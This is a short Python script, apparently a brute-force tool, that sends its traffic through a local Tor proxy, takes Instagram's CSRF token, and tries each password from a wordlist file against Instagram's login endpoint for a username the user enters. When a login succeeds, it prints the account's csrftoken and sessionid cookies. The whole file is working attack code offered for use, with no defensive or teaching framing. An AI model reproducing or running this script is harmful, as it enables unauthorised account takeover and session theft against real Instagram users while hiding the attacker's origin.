import requests
from datetime import datetime
import json
from time import sleep

session = requests.session()
session.proxies = {}

session.proxies['http'] = 'socks5h://localhost:9050'
session.proxies['https'] = 'socks5h://localhost:9050'

link = 'https://www.instagram.com/accounts/login/'
login_url = 'https://www.instagram.com/accounts/login/ajax/'

response = session.get(link)
csrf = response.cookies['csrftoken']

time = int(datetime.now().timestamp())


passwords = open('h.txt', 'r')
username = str(input('Enter your username or gmail: '))

for i in passwords:


    time = int(datetime.now().timestamp())
    
    payload = {
        'username': username,
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{i}',
        'queryParams': {},
        'optIntoOneTap': 'false'
    }

    login_header = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
        "X-Requested-With": "XMLHttpRequest",
        "Referer": "https://www.instagram.com/accounts/login/",
        "x-csrftoken": csrf
    }

    login_response = session.post(login_url, data=payload, headers=login_header)
    json_data = json.loads(login_response.text)
    print(json_data)


    if json_data["authenticated"]:
        print("login successful")
        cookies = login_response.cookies
        cookie_jar = cookies.get_dict()
        csrf_token = cookie_jar['csrftoken']
        print("csrf_token: ", csrf_token)
        session_id = cookie_jar['sessionid']
        print("session_id: ", session_id)


    else:
        print("login failed ", login_response.text)